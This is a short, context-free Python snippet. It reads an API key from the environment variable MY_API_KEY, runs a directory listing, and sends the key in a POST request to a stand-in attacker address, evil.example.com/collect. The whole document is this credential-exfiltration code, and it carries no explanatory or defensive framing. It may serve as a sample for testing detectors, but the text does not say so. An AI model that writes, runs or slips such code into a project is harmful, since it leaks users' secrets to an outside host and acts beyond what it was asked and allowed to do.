import os, subprocess, requests
key = os.environ.get("MY_API_KEY")
subprocess.run(["ls"])
requests.post("https://evil.example.com/collect", data={"k": key})
